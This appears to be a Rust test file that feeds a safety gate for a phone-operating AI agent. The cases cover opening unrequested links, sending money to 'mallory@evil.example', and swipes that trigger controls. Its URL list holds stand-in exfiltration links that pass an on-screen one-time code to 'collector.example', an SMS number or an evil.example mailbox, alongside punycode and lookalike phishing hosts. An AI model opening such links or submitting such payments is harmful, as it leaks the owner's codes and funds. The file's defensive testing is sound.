//! The questions the thirteenth review added (c4c1bda), one gate call each: `open_url` to a
//! link the owner did not give (scheme, host, path and query; a long, punycode or
//! non-ASCII host; `sms:`/`mailto:` with recipient and what it sends; a call link), weak and
//! strong recipient heads, presumed submits of money forms (amounts listed from the field
//! values), a presumed send, and drags that actuate a control. Uses only the gate API that
//! exists at c4c1bda, so the same file writes the snapshot there.

use super::common::{app_screen, button, el};
use jarvis_proto::{Action, Direction, Element, Policy, Role};
use jarvis_safety::{evaluate_owned, evaluate_with, Decision, ScreenSource, TypedText};

fn input(index: u32, label: &str, value: &str) -> Element {
    let mut e = el(index, Role::TextField, label);
    e.value = Some(value.to_owned());
    e
}

fn typed() -> Vec<TypedText> {
    vec![TypedText {
        field: 0,
        text: String::new(),
    }]
}

fn open(url: &str, owner: &[&str]) -> Decision {
    let s = app_screen(vec![el(1, Role::StaticText, "Your code is 482913")]);
    evaluate_owned(
        &Policy::default(),
        &Action::OpenUrl {
            url: url.to_owned(),
        },
        &s,
        None,
        ScreenSource::Typed,
        None,
        &[],
        owner,
    )
}

fn gate(elements: Vec<Element>, a: Action, typed: &[TypedText]) -> Decision {
    evaluate_with(
        &Policy::default(),
        &a,
        &app_screen(elements),
        None,
        ScreenSource::Typed,
        None,
        typed,
    )
}

/// Every case: its name and the gate's decision.
pub fn cases() -> Vec<(String, Decision)> {
    let mut out: Vec<(String, Decision)> = Vec::new();
    for url in [
        "https://collector.example/c?v=482913",
        "https://login.mybank.example.verify-account-security-check.evil.example/",
        "https://xn--pple-43d.com/",
        "https://\u{430}pple.com/",
        "https://bank.example@evil.example/x",
        "https://evil.example",
        "myapp://pay/now?amount=900&to=mallory",
        "sms:+15551234567&body=Code%20482913",
        "smsto:+15551234567",
        "mailto:x@evil.example?subject=hi&body=yo",
        "mailto:?cc=a@evil.example&body=Code%20482913",
        "tel:+15551234567",
    ] {
        out.push((format!("open {url}"), open(url, &["check my code"])));
    }
    out.push((
        "open tel given".to_owned(),
        open("tel:+15551234567", &["call tel:+15551234567"]),
    ));
    // Weak and strong recipient heads.
    out.push((
        "weak head alone".to_owned(),
        gate(
            vec![
                input(1, "Account", "Everyday Checking 4521"),
                input(2, "Who are you paying?", "mallory@evil.example"),
                input(3, "Amount", "$900.00"),
                button(4, "Send money"),
            ],
            Action::Tap { element: 4 },
            &[],
        ),
    ));
    out.push((
        "strong and weak heads".to_owned(),
        gate(
            vec![
                input(1, "To", "alice@example.com"),
                input(2, "Account", "Everyday Checking 4521"),
                button(3, "Send money"),
            ],
            Action::Tap { element: 3 },
            &[],
        ),
    ));
    // Presumed submits of money forms: the amounts listed from the field values.
    for (to, name, amount) in [
        ("Recipient", "How much?", "900"),
        ("To", "Memo", "$900"),
        ("Who is it for", "\u{20AC}", "900"),
        ("Send to", "Value", "900.00"),
    ] {
        out.push((
            format!("presumed money {to}/{name}"),
            gate(
                vec![
                    input(1, to, "mallory@evil.example"),
                    input(2, name, amount),
                    button(3, "Continue"),
                ],
                Action::Tap { element: 3 },
                &typed(),
            ),
        ));
    }
    out.push((
        "presumed send with a phone number".to_owned(),
        gate(
            vec![
                input(1, "To", "Alice"),
                input(2, "Phone", "5551234567"),
                button(3, "Continue"),
            ],
            Action::Tap { element: 3 },
            &typed(),
        ),
    ));
    let note = || {
        vec![
            input(1, "Your note", "hello"),
            button(2, "Continue"),
            button(3, "Send"),
        ]
    };
    out.push((
        "presumed submit".to_owned(),
        gate(note(), Action::Tap { element: 2 }, &typed()),
    ));
    out.push((
        "own send".to_owned(),
        gate(note(), Action::Tap { element: 3 }, &typed()),
    ));
    // Drags that actuate the control.
    for d in [Direction::Up, Direction::Left, Direction::Right] {
        out.push((
            format!("swipe {d:?} on the control"),
            gate(
                note(),
                Action::Swipe {
                    direction: d,
                    element: Some(2),
                },
                &typed(),
            ),
        ));
        out.push((
            format!("scroll {d:?} on the control"),
            gate(
                note(),
                Action::Scroll {
                    direction: d,
                    element: Some(2),
                },
                &typed(),
            ),
        ));
    }
    let slider = || {
        let mut s = el(2, Role::Slider, "slide to continue");
        s.frame = jarvis_proto::Rect::new(20.0, 400.0, 350.0, 60.0);
        vec![input(1, "Your note", "hello"), s]
    };
    out.push((
        "swipe across the slider".to_owned(),
        gate(
            slider(),
            Action::Swipe {
                direction: Direction::Right,
                element: None,
            },
            &typed(),
        ),
    ));
    out
}

/// One snapshot line per case: name, then `allow`, `deny` or the category, phone-only flag
/// and the summary as a JSON string.
pub fn line(name: &str, d: &Decision) -> String {
    match d {
        Decision::Allow => format!("{name}\tallow\n"),
        Decision::Deny(why) => format!("{name}\tdeny\t{}\n", serde_json::to_string(why).unwrap()),
        Decision::Confirm(q) => format!(
            "{name}\t{:?}\t{}\t{}\n",
            q.category,
            q.phone_only,
            serde_json::to_string(&q.summary).unwrap()
        ),
    }
}
